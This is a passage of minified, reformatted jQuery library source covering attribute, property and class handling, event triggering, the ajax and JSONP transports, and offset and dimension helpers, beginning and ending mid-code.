              void 0 !== n
                ? null === n
                  ? void ee.removeAttr(e, t)
                  : o && "set" in o && void 0 !== (i = o.set(e, n, t))
                  ? i
                  : (e.setAttribute(t, n + ""), n)
                : o && "get" in o && null !== (i = o.get(e, t))
                ? i
                : null == (i = ee.find.attr(e, t))
                ? void 0
                : i);
      },
      attrHooks: {
        type: {
          set: function (e, t) {
            if (!J.radioValue && "radio" === t && ee.nodeName(e, "input")) {
              var n = e.value;
              return e.setAttribute("type", t), n && (e.value = n), t;
            }
          },
        },
      },
      removeAttr: function (e, t) {
        var n,
          i,
          o = 0,
          r = t && t.match(me);
        if (r && 1 === e.nodeType) for (; (n = r[o++]); ) (i = ee.propFix[n] || n), ee.expr.match.bool.test(n) && (e[i] = !1), e.removeAttribute(n);
      },
    }),
    (nt = {
      set: function (e, t, n) {
        return !1 === t ? ee.removeAttr(e, n) : e.setAttribute(n, n), n;
      },
    }),
    ee.each(ee.expr.match.bool.source.match(/\w+/g), function (e, t) {
      var n = it[t] || ee.find.attr;
      it[t] = function (e, t, i) {
        var o, r;
        return i || ((r = it[t]), (it[t] = o), (o = null != n(e, t, i) ? t.toLowerCase() : null), (it[t] = r)), o;
      };
    });
  var ot = /^(?:input|select|textarea|button)$/i,
    rt = /^(?:a|area)$/i;
  ee.fn.extend({
    prop: function (e, t) {
      return ve(this, ee.prop, e, t, arguments.length > 1);
    },
    removeProp: function (e) {
      return this.each(function () {
        delete this[ee.propFix[e] || e];
      });
    },
  }),
    ee.extend({
      prop: function (e, t, n) {
        var i,
          o,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return (
            (1 === r && ee.isXMLDoc(e)) || ((t = ee.propFix[t] || t), (o = ee.propHooks[t])), void 0 !== n ? (o && "set" in o && void 0 !== (i = o.set(e, n, t)) ? i : (e[t] = n)) : o && "get" in o && null !== (i = o.get(e, t)) ? i : e[t]
          );
      },
      propHooks: {
        tabIndex: {
          get: function (e) {
            var t = ee.find.attr(e, "tabindex");
            return t ? parseInt(t, 10) : ot.test(e.nodeName) || (rt.test(e.nodeName) && e.href) ? 0 : -1;
          },
        },
      },
      propFix: { for: "htmlFor", class: "className" },
    }),
    J.optSelected ||
      (ee.propHooks.selected = {
        get: function (e) {
          var t = e.parentNode;
          return t && t.parentNode && t.parentNode.selectedIndex, null;
        },
      }),
    ee.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
      ee.propFix[this.toLowerCase()] = this;
    });
  var st = /[\t\r\n\f]/g;
  ee.fn.extend({
    addClass: function (e) {
      var t,
        n,
        i,
        o,
        r,
        s,
        a,
        l = 0;
      if (ee.isFunction(e))
        return this.each(function (t) {
          ee(this).addClass(e.call(this, t, L(this)));
        });
      if ("string" == typeof e && e)
        for (t = e.match(me) || []; (n = this[l++]); )
          if (((o = L(n)), (i = 1 === n.nodeType && (" " + o + " ").replace(st, " ")))) {
            for (s = 0; (r = t[s++]); ) i.indexOf(" " + r + " ") < 0 && (i += r + " ");
            o !== (a = ee.trim(i)) && n.setAttribute("class", a);
          }
      return this;
    },
    removeClass: function (e) {
      var t,
        n,
        i,
        o,
        r,
        s,
        a,
        l = 0;
      if (ee.isFunction(e))
        return this.each(function (t) {
          ee(this).removeClass(e.call(this, t, L(this)));
        });
      if (!arguments.length) return this.attr("class", "");
      if ("string" == typeof e && e)
        for (t = e.match(me) || []; (n = this[l++]); )
          if (((o = L(n)), (i = 1 === n.nodeType && (" " + o + " ").replace(st, " ")))) {
            for (s = 0; (r = t[s++]); ) for (; i.indexOf(" " + r + " ") > -1; ) i = i.replace(" " + r + " ", " ");
            o !== (a = ee.trim(i)) && n.setAttribute("class", a);
          }
      return this;
    },
    toggleClass: function (e, t) {
      var n = typeof e;
      return "boolean" == typeof t && "string" === n
        ? t
          ? this.addClass(e)
          : this.removeClass(e)
        : ee.isFunction(e)
        ? this.each(function (n) {
            ee(this).toggleClass(e.call(this, n, L(this), t), t);
          })
        : this.each(function () {
            var t, i, o, r;
            if ("string" === n) for (i = 0, o = ee(this), r = e.match(me) || []; (t = r[i++]); ) o.hasClass(t) ? o.removeClass(t) : o.addClass(t);
            else (void 0 === e || "boolean" === n) && ((t = L(this)) && we.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : we.get(this, "__className__") || ""));
          });
    },
    hasClass: function (e) {
      var t,
        n,
        i = 0;
      for (t = " " + e + " "; (n = this[i++]); ) if (1 === n.nodeType && (" " + L(n) + " ").replace(st, " ").indexOf(t) > -1) return !0;
      return !1;
    },
  });
  var at = /\r/g;
  ee.fn.extend({
    val: function (e) {
      var t,
        n,
        i,
        o = this[0];
      return arguments.length
        ? ((i = ee.isFunction(e)),
          this.each(function (n) {
            var o;
            1 === this.nodeType &&
              (null == (o = i ? e.call(this, n, ee(this).val()) : e)
                ? (o = "")
                : "number" == typeof o
                ? (o += "")
                : ee.isArray(o) &&
                  (o = ee.map(o, function (e) {
                    return null == e ? "" : e + "";
                  })),
              ((t = ee.valHooks[this.type] || ee.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, o, "value")) || (this.value = o));
          }))
        : o
        ? (t = ee.valHooks[o.type] || ee.valHooks[o.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(o, "value"))
          ? n
          : "string" == typeof (n = o.value)
          ? n.replace(at, "")
          : null == n
          ? ""
          : n
        : void 0;
    },
  }),
    ee.extend({
      valHooks: {
        option: {
          get: function (e) {
            return ee.trim(e.value);
          },
        },
        select: {
          get: function (e) {
            for (var t, n, i = e.options, o = e.selectedIndex, r = "select-one" === e.type || 0 > o, s = r ? null : [], a = r ? o + 1 : i.length, l = 0 > o ? a : r ? o : 0; a > l; l++)
              if (((n = i[l]).selected || l === o) && (J.optDisabled ? !n.disabled : null === n.getAttribute("disabled")) && (!n.parentNode.disabled || !ee.nodeName(n.parentNode, "optgroup"))) {
                if (((t = ee(n).val()), r)) return t;
                s.push(t);
              }
            return s;
          },
          set: function (e, t) {
            for (var n, i, o = e.options, r = ee.makeArray(t), s = o.length; s--; ) ((i = o[s]).selected = ee.inArray(ee.valHooks.option.get(i), r) > -1) && (n = !0);
            return n || (e.selectedIndex = -1), r;
          },
        },
      },
    }),
    ee.each(["radio", "checkbox"], function () {
      (ee.valHooks[this] = {
        set: function (e, t) {
          return ee.isArray(t) ? (e.checked = ee.inArray(ee(e).val(), t) > -1) : void 0;
        },
      }),
        J.checkOn ||
          (ee.valHooks[this].get = function (e) {
            return null === e.getAttribute("value") ? "on" : e.value;
          });
    });
  var lt = /^(?:focusinfocus|focusoutblur)$/;
  ee.extend(ee.event, {
    trigger: function (t, n, i, o) {
      var r,
        s,
        a,
        l,
        c,
        u,
        d,
        p = [i || B],
        f = G.call(t, "type") ? t.type : t,
        h = G.call(t, "namespace") ? t.namespace.split(".") : [];
      if (
        ((s = a = i = i || B),
        3 !== i.nodeType &&
          8 !== i.nodeType &&
          !lt.test(f + ee.event.triggered) &&
          (f.indexOf(".") > -1 && ((h = f.split(".")), (f = h.shift()), h.sort()),
          (c = f.indexOf(":") < 0 && "on" + f),
          ((t = t[ee.expando] ? t : new ee.Event(f, "object" == typeof t && t)).isTrigger = o ? 2 : 3),
          (t.namespace = h.join(".")),
          (t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null),
          (t.result = void 0),
          t.target || (t.target = i),
          (n = null == n ? [t] : ee.makeArray(n, [t])),
          (d = ee.event.special[f] || {}),
          o || !d.trigger || !1 !== d.trigger.apply(i, n)))
      ) {
        if (!o && !d.noBubble && !ee.isWindow(i)) {
          for (l = d.delegateType || f, lt.test(l + f) || (s = s.parentNode); s; s = s.parentNode) p.push(s), (a = s);
          a === (i.ownerDocument || B) && p.push(a.defaultView || a.parentWindow || e);
        }
        for (r = 0; (s = p[r++]) && !t.isPropagationStopped(); )
          (t.type = r > 1 ? l : d.bindType || f), (u = (we.get(s, "events") || {})[t.type] && we.get(s, "handle")) && u.apply(s, n), (u = c && s[c]) && u.apply && ye(s) && ((t.result = u.apply(s, n)), !1 === t.result && t.preventDefault());
        return (
          (t.type = f),
          o ||
            t.isDefaultPrevented() ||
            (d._default && !1 !== d._default.apply(p.pop(), n)) ||
            !ye(i) ||
            (c && ee.isFunction(i[f]) && !ee.isWindow(i) && ((a = i[c]) && (i[c] = null), (ee.event.triggered = f), i[f](), (ee.event.triggered = void 0), a && (i[c] = a))),
          t.result
        );
      }
    },
    simulate: function (e, t, n) {
      var i = ee.extend(new ee.Event(), n, { type: e, isSimulated: !0 });
      ee.event.trigger(i, null, t), i.isDefaultPrevented() && n.preventDefault();
    },
  }),
    ee.fn.extend({
      trigger: function (e, t) {
        return this.each(function () {
          ee.event.trigger(e, t, this);
        });
      },
      triggerHandler: function (e, t) {
        var n = this[0];
        return n ? ee.event.trigger(e, t, n, !0) : void 0;
      },
    }),
    ee.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function (
      e,
      t
    ) {
      ee.fn[t] = function (e, n) {
        return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t);
      };
    }),
    ee.fn.extend({
      hover: function (e, t) {
        return this.mouseenter(e).mouseleave(t || e);
      },
    }),
    (J.focusin = "onfocusin" in e),
    J.focusin ||
      ee.each({ focus: "focusin", blur: "focusout" }, function (e, t) {
        var n = function (e) {
          ee.event.simulate(t, e.target, ee.event.fix(e));
        };
        ee.event.special[t] = {
          setup: function () {
            var i = this.ownerDocument || this,
              o = we.access(i, t);
            o || i.addEventListener(e, n, !0), we.access(i, t, (o || 0) + 1);
          },
          teardown: function () {
            var i = this.ownerDocument || this,
              o = we.access(i, t) - 1;
            o ? we.access(i, t, o) : (i.removeEventListener(e, n, !0), we.remove(i, t));
          },
        };
      });
  var ct = e.location,
    ut = ee.now(),
    dt = /\?/;
  (ee.parseJSON = function (e) {
    return JSON.parse(e + "");
  }),
    (ee.parseXML = function (t) {
      var n;
      if (!t || "string" != typeof t) return null;
      try {
        n = new e.DOMParser().parseFromString(t, "text/xml");
      } catch (e) {
        n = void 0;
      }
      return (!n || n.getElementsByTagName("parsererror").length) && ee.error("Invalid XML: " + t), n;
    });
  var pt = /#.*$/,
    ft = /([?&])_=[^&]*/,
    ht = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    gt = /^(?:GET|HEAD)$/,
    mt = /^\/\//,
    vt = {},
    yt = {},
    wt = "*/".concat("*"),
    bt = B.createElement("a");
  (bt.href = ct.href),
    ee.extend({
      active: 0,
      lastModified: {},
      etag: {},
      ajaxSettings: {
        url: ct.href,
        type: "GET",
        isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(ct.protocol),
        global: !0,
        processData: !0,
        async: !0,
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        accepts: { "*": wt, text: "text/plain", html: "text/html", xml: "application/xml, text/xml", json: "application/json, text/javascript" },
        contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
        responseFields: { xml: "responseXML", text: "responseText", json: "responseJSON" },
        converters: { "* text": String, "text html": !0, "text json": ee.parseJSON, "text xml": ee.parseXML },
        flatOptions: { url: !0, context: !0 },
      },
      ajaxSetup: function (e, t) {
        return t ? q(q(e, ee.ajaxSettings), t) : q(ee.ajaxSettings, e);
      },
      ajaxPrefilter: M(vt),
      ajaxTransport: M(yt),
      ajax: function (t, n) {
        function i(t, n, i, a) {
          var c,
            d,
            y,
            w,
            T,
            C = n;
          2 !== b &&
            ((b = 2),
            l && e.clearTimeout(l),
            (o = void 0),
            (s = a || ""),
            (_.readyState = t > 0 ? 4 : 0),
            (c = (t >= 200 && 300 > t) || 304 === t),
            i &&
              (w = (function (e, t, n) {
                for (var i, o, r, s, a = e.contents, l = e.dataTypes; "*" === l[0]; ) l.shift(), void 0 === i && (i = e.mimeType || t.getResponseHeader("Content-Type"));
                if (i)
                  for (o in a)
                    if (a[o] && a[o].test(i)) {
                      l.unshift(o);
                      break;
                    }
                if (l[0] in n) r = l[0];
                else {
                  for (o in n) {
                    if (!l[0] || e.converters[o + " " + l[0]]) {
                      r = o;
                      break;
                    }
                    s || (s = o);
                  }
                  r = r || s;
                }
                return r ? (r !== l[0] && l.unshift(r), n[r]) : void 0;
              })(p, _, i)),
            (w = (function (e, t, n, i) {
              var o,
                r,
                s,
                a,
                l,
                c = {},
                u = e.dataTypes.slice();
              if (u[1]) for (s in e.converters) c[s.toLowerCase()] = e.converters[s];
              for (r = u.shift(); r; )
                if ((e.responseFields[r] && (n[e.responseFields[r]] = t), !l && i && e.dataFilter && (t = e.dataFilter(t, e.dataType)), (l = r), (r = u.shift())))
                  if ("*" === r) r = l;
                  else if ("*" !== l && l !== r) {
                    if (!(s = c[l + " " + r] || c["* " + r]))
                      for (o in c)
                        if ((a = o.split(" "))[1] === r && (s = c[l + " " + a[0]] || c["* " + a[0]])) {
                          !0 === s ? (s = c[o]) : !0 !== c[o] && ((r = a[0]), u.unshift(a[1]));
                          break;
                        }
                    if (!0 !== s)
                      if (s && e.throws) t = s(t);
                      else
                        try {
                          t = s(t);
                        } catch (e) {
                          return { state: "parsererror", error: s ? e : "No conversion from " + l + " to " + r };
                        }
                  }
              return { state: "success", data: t };
            })(p, w, _, c)),
            c
              ? (p.ifModified && ((T = _.getResponseHeader("Last-Modified")) && (ee.lastModified[r] = T), (T = _.getResponseHeader("etag")) && (ee.etag[r] = T)),
                204 === t || "HEAD" === p.type ? (C = "nocontent") : 304 === t ? (C = "notmodified") : ((C = w.state), (d = w.data), (c = !(y = w.error))))
              : ((y = C), (t || !C) && ((C = "error"), 0 > t && (t = 0))),
            (_.status = t),
            (_.statusText = (n || C) + ""),
            c ? g.resolveWith(f, [d, C, _]) : g.rejectWith(f, [_, C, y]),
            _.statusCode(v),
            (v = void 0),
            u && h.trigger(c ? "ajaxSuccess" : "ajaxError", [_, p, c ? d : y]),
            m.fireWith(f, [_, C]),
            u && (h.trigger("ajaxComplete", [_, p]), --ee.active || ee.event.trigger("ajaxStop")));
        }
        "object" == typeof t && ((n = t), (t = void 0)), (n = n || {});
        var o,
          r,
          s,
          a,
          l,
          c,
          u,
          d,
          p = ee.ajaxSetup({}, n),
          f = p.context || p,
          h = p.context && (f.nodeType || f.jquery) ? ee(f) : ee.event,
          g = ee.Deferred(),
          m = ee.Callbacks("once memory"),
          v = p.statusCode || {},
          y = {},
          w = {},
          b = 0,
          T = "canceled",
          _ = {
            readyState: 0,
            getResponseHeader: function (e) {
              var t;
              if (2 === b) {
                if (!a) for (a = {}; (t = ht.exec(s)); ) a[t[1].toLowerCase()] = t[2];
                t = a[e.toLowerCase()];
              }
              return null == t ? null : t;
            },
            getAllResponseHeaders: function () {
              return 2 === b ? s : null;
            },
            setRequestHeader: function (e, t) {
              var n = e.toLowerCase();
              return b || ((e = w[n] = w[n] || e), (y[e] = t)), this;
            },
            overrideMimeType: function (e) {
              return b || (p.mimeType = e), this;
            },
            statusCode: function (e) {
              var t;
              if (e)
                if (2 > b) for (t in e) v[t] = [v[t], e[t]];
                else _.always(e[_.status]);
              return this;
            },
            abort: function (e) {
              var t = e || T;
              return o && o.abort(t), i(0, t), this;
            },
          };
        if (
          ((g.promise(_).complete = m.add),
          (_.success = _.done),
          (_.error = _.fail),
          (p.url = ((t || p.url || ct.href) + "").replace(pt, "").replace(mt, ct.protocol + "//")),
          (p.type = n.method || n.type || p.method || p.type),
          (p.dataTypes = ee
            .trim(p.dataType || "*")
            .toLowerCase()
            .match(me) || [""]),
          null == p.crossDomain)
        ) {
          c = B.createElement("a");
          try {
            (c.href = p.url), (c.href = c.href), (p.crossDomain = bt.protocol + "//" + bt.host != c.protocol + "//" + c.host);
          } catch (e) {
            p.crossDomain = !0;
          }
        }
        if ((p.data && p.processData && "string" != typeof p.data && (p.data = ee.param(p.data, p.traditional)), R(vt, p, n, _), 2 === b)) return _;
        for (d in ((u = ee.event && p.global) && 0 == ee.active++ && ee.event.trigger("ajaxStart"),
        (p.type = p.type.toUpperCase()),
        (p.hasContent = !gt.test(p.type)),
        (r = p.url),
        p.hasContent || (p.data && ((r = p.url += (dt.test(r) ? "&" : "?") + p.data), delete p.data), !1 === p.cache && (p.url = ft.test(r) ? r.replace(ft, "$1_=" + ut++) : r + (dt.test(r) ? "&" : "?") + "_=" + ut++)),
        p.ifModified && (ee.lastModified[r] && _.setRequestHeader("If-Modified-Since", ee.lastModified[r]), ee.etag[r] && _.setRequestHeader("If-None-Match", ee.etag[r])),
        ((p.data && p.hasContent && !1 !== p.contentType) || n.contentType) && _.setRequestHeader("Content-Type", p.contentType),
        _.setRequestHeader("Accept", p.dataTypes[0] && p.accepts[p.dataTypes[0]] ? p.accepts[p.dataTypes[0]] + ("*" !== p.dataTypes[0] ? ", " + wt + "; q=0.01" : "") : p.accepts["*"]),
        p.headers))
          _.setRequestHeader(d, p.headers[d]);
        if (p.beforeSend && (!1 === p.beforeSend.call(f, _, p) || 2 === b)) return _.abort();
        for (d in ((T = "abort"), { success: 1, error: 1, complete: 1 })) _[d](p[d]);
        if ((o = R(yt, p, n, _))) {
          if (((_.readyState = 1), u && h.trigger("ajaxSend", [_, p]), 2 === b)) return _;
          p.async &&
            p.timeout > 0 &&
            (l = e.setTimeout(function () {
              _.abort("timeout");
            }, p.timeout));
          try {
            (b = 1), o.send(y, i);
          } catch (e) {
            if (!(2 > b)) throw e;
            i(-1, e);
          }
        } else i(-1, "No Transport");
        return _;
      },
      getJSON: function (e, t, n) {
        return ee.get(e, t, n, "json");
      },
      getScript: function (e, t) {
        return ee.get(e, void 0, t, "script");
      },
    }),
    ee.each(["get", "post"], function (e, t) {
      ee[t] = function (e, n, i, o) {
        return ee.isFunction(n) && ((o = o || i), (i = n), (n = void 0)), ee.ajax(ee.extend({ url: e, type: t, dataType: o, data: n, success: i }, ee.isPlainObject(e) && e));
      };
    }),
    (ee._evalUrl = function (e) {
      return ee.ajax({ url: e, type: "GET", dataType: "script", async: !1, global: !1, throws: !0 });
    }),
    ee.fn.extend({
      wrapAll: function (e) {
        var t;
        return ee.isFunction(e)
          ? this.each(function (t) {
              ee(this).wrapAll(e.call(this, t));
            })
          : (this[0] &&
              ((t = ee(e, this[0].ownerDocument).eq(0).clone(!0)),
              this[0].parentNode && t.insertBefore(this[0]),
              t
                .map(function () {
                  for (var e = this; e.firstElementChild; ) e = e.firstElementChild;
                  return e;
                })
                .append(this)),
            this);
      },
      wrapInner: function (e) {
        return ee.isFunction(e)
          ? this.each(function (t) {
              ee(this).wrapInner(e.call(this, t));
            })
          : this.each(function () {
              var t = ee(this),
                n = t.contents();
              n.length ? n.wrapAll(e) : t.append(e);
            });
      },
      wrap: function (e) {
        var t = ee.isFunction(e);
        return this.each(function (n) {
          ee(this).wrapAll(t ? e.call(this, n) : e);
        });
      },
      unwrap: function () {
        return this.parent()
          .each(function () {
            ee.nodeName(this, "body") || ee(this).replaceWith(this.childNodes);
          })
          .end();
      },
    }),
    (ee.expr.filters.hidden = function (e) {
      return !ee.expr.filters.visible(e);
    }),
    (ee.expr.filters.visible = function (e) {
      return e.offsetWidth > 0 || e.offsetHeight > 0 || e.getClientRects().length > 0;
    });
  var Tt = /%20/g,
    _t = /\[\]$/,
    Ct = /\r?\n/g,
    kt = /^(?:submit|button|image|reset|file)$/i,
    St = /^(?:input|select|textarea|keygen)/i;
  (ee.param = function (e, t) {
    var n,
      i = [],
      o = function (e, t) {
        (t = ee.isFunction(t) ? t() : null == t ? "" : t), (i[i.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t));
      };
    if ((void 0 === t && (t = ee.ajaxSettings && ee.ajaxSettings.traditional), ee.isArray(e) || (e.jquery && !ee.isPlainObject(e))))
      ee.each(e, function () {
        o(this.name, this.value);
      });
    else for (n in e) W(n, e[n], t, o);
    return i.join("&").replace(Tt, "+");
  }),
    ee.fn.extend({
      serialize: function () {
        return ee.param(this.serializeArray());
      },
      serializeArray: function () {
        return this.map(function () {
          var e = ee.prop(this, "elements");
          return e ? ee.makeArray(e) : this;
        })
          .filter(function () {
            var e = this.type;
            return this.name && !ee(this).is(":disabled") && St.test(this.nodeName) && !kt.test(e) && (this.checked || !Ee.test(e));
          })
          .map(function (e, t) {
            var n = ee(this).val();
            return null == n
              ? null
              : ee.isArray(n)
              ? ee.map(n, function (e) {
                  return { name: t.name, value: e.replace(Ct, "\r\n") };
                })
              : { name: t.name, value: n.replace(Ct, "\r\n") };
          })
          .get();
      },
    }),
    (ee.ajaxSettings.xhr = function () {
      try {
        return new e.XMLHttpRequest();
      } catch (e) {}
    });
  var xt = { 0: 200, 1223: 204 },
    Et = ee.ajaxSettings.xhr();
  (J.cors = !!Et && "withCredentials" in Et),
    (J.ajax = Et = !!Et),
    ee.ajaxTransport(function (t) {
      var n, i;
      return J.cors || (Et && !t.crossDomain)
        ? {
            send: function (o, r) {
              var s,
                a = t.xhr();
              if ((a.open(t.type, t.url, t.async, t.username, t.password), t.xhrFields)) for (s in t.xhrFields) a[s] = t.xhrFields[s];
              for (s in (t.mimeType && a.overrideMimeType && a.overrideMimeType(t.mimeType), t.crossDomain || o["X-Requested-With"] || (o["X-Requested-With"] = "XMLHttpRequest"), o)) a.setRequestHeader(s, o[s]);
              (n = function (e) {
                return function () {
                  n &&
                    ((n = i = a.onload = a.onerror = a.onabort = a.onreadystatechange = null),
                    "abort" === e
                      ? a.abort()
                      : "error" === e
                      ? "number" != typeof a.status
                        ? r(0, "error")
                        : r(a.status, a.statusText)
                      : r(xt[a.status] || a.status, a.statusText, "text" !== (a.responseType || "text") || "string" != typeof a.responseText ? { binary: a.response } : { text: a.responseText }, a.getAllResponseHeaders()));
                };
              }),
                (a.onload = n()),
                (i = a.onerror = n("error")),
                void 0 !== a.onabort
                  ? (a.onabort = i)
                  : (a.onreadystatechange = function () {
                      4 === a.readyState &&
                        e.setTimeout(function () {
                          n && i();
                        });
                    }),
                (n = n("abort"));
              try {
                a.send((t.hasContent && t.data) || null);
              } catch (e) {
                if (n) throw e;
              }
            },
            abort: function () {
              n && n();
            },
          }
        : void 0;
    }),
    ee.ajaxSetup({
      accepts: { script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" },
      contents: { script: /\b(?:java|ecma)script\b/ },
      converters: {
        "text script": function (e) {
          return ee.globalEval(e), e;
        },
      },
    }),
    ee.ajaxPrefilter("script", function (e) {
      void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET");
    }),
    ee.ajaxTransport("script", function (e) {
      var t, n;
      if (e.crossDomain)
        return {
          send: function (i, o) {
            (t = ee("<script>")
              .prop({ charset: e.scriptCharset, src: e.url })
              .on(
                "load error",
                (n = function (e) {
                  t.remove(), (n = null), e && o("error" === e.type ? 404 : 200, e.type);
                })
              )),
              B.head.appendChild(t[0]);
          },
          abort: function () {
            n && n();
          },
        };
    });
  var At = [],
    Dt = /(=)\?(?=&|$)|\?\?/;
  ee.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var e = At.pop() || ee.expando + "_" + ut++;
      return (this[e] = !0), e;
    },
  }),
    ee.ajaxPrefilter("json jsonp", function (t, n, i) {
      var o,
        r,
        s,
        a = !1 !== t.jsonp && (Dt.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && Dt.test(t.data) && "data");
      return a || "jsonp" === t.dataTypes[0]
        ? ((o = t.jsonpCallback = ee.isFunction(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback),
          a ? (t[a] = t[a].replace(Dt, "$1" + o)) : !1 !== t.jsonp && (t.url += (dt.test(t.url) ? "&" : "?") + t.jsonp + "=" + o),
          (t.converters["script json"] = function () {
            return s || ee.error(o + " was not called"), s[0];
          }),
          (t.dataTypes[0] = "json"),
          (r = e[o]),
          (e[o] = function () {
            s = arguments;
          }),
          i.always(function () {
            void 0 === r ? ee(e).removeProp(o) : (e[o] = r), t[o] && ((t.jsonpCallback = n.jsonpCallback), At.push(o)), s && ee.isFunction(r) && r(s[0]), (s = r = void 0);
          }),
          "script")
        : void 0;
    }),
    (J.createHTMLDocument = (function () {
      var e = B.implementation.createHTMLDocument("").body;
      return (e.innerHTML = "<form></form><form></form>"), 2 === e.childNodes.length;
    })()),
    (ee.parseHTML = function (e, t, n) {
      if (!e || "string" != typeof e) return null;
      "boolean" == typeof t && ((n = t), (t = !1)), (t = t || (J.createHTMLDocument ? B.implementation.createHTMLDocument("") : B));
      var i = ce.exec(e),
        o = !n && [];
      return i ? [t.createElement(i[1])] : ((i = d([e], t, o)), o && o.length && ee(o).remove(), ee.merge([], i.childNodes));
    });
  var Nt = ee.fn.load;
  (ee.fn.load = function (e, t, n) {
    if ("string" != typeof e && Nt) return Nt.apply(this, arguments);
    var i,
      o,
      r,
      s = this,
      a = e.indexOf(" ");
    return (
      a > -1 && ((i = ee.trim(e.slice(a))), (e = e.slice(0, a))),
      ee.isFunction(t) ? ((n = t), (t = void 0)) : t && "object" == typeof t && (o = "POST"),
      s.length > 0 &&
        ee
          .ajax({ url: e, type: o || "GET", dataType: "html", data: t })
          .done(function (e) {
            (r = arguments), s.html(i ? ee("<div>").append(ee.parseHTML(e)).find(i) : e);
          })
          .always(
            n &&
              function (e, t) {
                s.each(function () {
                  n.apply(s, r || [e.responseText, t, e]);
                });
              }
          ),
      this
    );
  }),
    ee.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) {
      ee.fn[t] = function (e) {
        return this.on(t, e);
      };
    }),
    (ee.expr.filters.animated = function (e) {
      return ee.grep(ee.timers, function (t) {
        return e === t.elem;
      }).length;
    }),
    (ee.offset = {
      setOffset: function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l,
          c = ee.css(e, "position"),
          u = ee(e),
          d = {};
        "static" === c && (e.style.position = "relative"),
          (a = u.offset()),
          (r = ee.css(e, "top")),
          (l = ee.css(e, "left")),
          ("absolute" === c || "fixed" === c) && (r + l).indexOf("auto") > -1 ? ((s = (i = u.position()).top), (o = i.left)) : ((s = parseFloat(r) || 0), (o = parseFloat(l) || 0)),
          ee.isFunction(t) && (t = t.call(e, n, ee.extend({}, a))),
          null != t.top && (d.top = t.top - a.top + s),
          null != t.left && (d.left = t.left - a.left + o),
          "using" in t ? t.using.call(e, d) : u.css(d);
      },
    }),
    ee.fn.extend({
      offset: function (e) {
        if (arguments.length)
          return void 0 === e
            ? this
            : this.each(function (t) {
                ee.offset.setOffset(this, e, t);
              });
        var t,
          n,
          i = this[0],
          o = { top: 0, left: 0 },
          r = i && i.ownerDocument;
        return r ? ((t = r.documentElement), ee.contains(t, i) ? ((o = i.getBoundingClientRect()), (n = F(r)), { top: o.top + n.pageYOffset - t.clientTop, left: o.left + n.pageXOffset - t.clientLeft }) : o) : void 0;
      },
      position: function () {
        if (this[0]) {
          var e,
            t,
            n = this[0],
            i = { top: 0, left: 0 };
          return (
            "fixed" === ee.css(n, "position")
              ? (t = n.getBoundingClientRect())
              : ((e = this.offsetParent()), (t = this.offset()), ee.nodeName(e[0], "html") || (i = e.offset()), (i.top += ee.css(e[0], "borderTopWidth", !0)), (i.left += ee.css(e[0], "borderLeftWidth", !0))),
            { top: t.top - i.top - ee.css(n, "marginTop", !0), left: t.left - i.left - ee.css(n, "marginLeft", !0) }
          );
        }
      },
      offsetParent: function () {
        return this.map(function () {
          for (var e = this.offsetParent; e && "static" === ee.css(e, "position"); ) e = e.offsetParent;
          return e || Ke;
        });
      },
    }),
    ee.each({ scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function (e, t) {
      var n = "pageYOffset" === t;
      ee.fn[e] = function (i) {
        return ve(
          this,
          function (e, i, o) {
            var r = F(e);
            return void 0 === o ? (r ? r[t] : e[i]) : void (r ? r.scrollTo(n ? r.pageXOffset : o, n ? o : r.pageYOffset) : (e[i] = o));
          },
          e,
          i,
          arguments.length
        );
      };
    }),
    ee.each(["top", "left"], function (e, t) {
      ee.cssHooks[t] = x(J.pixelPosition, function (e, n) {
        return n ? ((n = S(e, t)), ze.test(n) ? ee(e).position()[t] + "px" : n) : void 0;
      });
    }),
    ee.each({ Height: "height", Width: "width" }, function (e, t) {
      ee.each({ padding: "inner" + e, content: t, "": "outer" + e }, function (n, i) {
        ee.fn[i] = function (i, o) {
          var r = arguments.length && (n || "boolean" != typeof i),
            s = n || (!0 === i || !0 === o ? "margin" : "border");
          return ve(
            this,
            function (t, n, i) {
              var o;
              return ee.isWindow(t)
                ? t.document.documentElement["client" + e]
                : 9 === t.nodeType
                ? ((o = t.documentElement), Math.max(t.body["scroll" + e], o["scroll" + e], t.body["offset" + e], o["offset" + e], o["client" + e]))
                : void 0 === i
                ? ee.css(t, n, s)
                : ee.style(t, n, i, s);
            },
            t,
            r ? i : void 0,
            r,
            null
          );
        };
      });
    }),
    ee.fn.extend({
      bind: function (e, t, n) {
        return this.on(e, null, t, n);
      },
      unbind: function (e, t) {
        return this.off(e, null, t);
      },
      delegate: function (e, t, n, i) {
        return this.on(t, e, n, i);
      },
      undelegate: function (e, t, n) {
        return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n);
      },
      size: function () {
        return this.length;
      },
    }),
    (ee.fn.andSelf = ee.fn.addBack),
    "function" == typeof define &&
      define.amd &&
      define("jquery", [], function () {
        return ee;
      });
  var It = e.jQuery,
    $t = e.$;
  return (
    (ee.noConflict = function (t) {
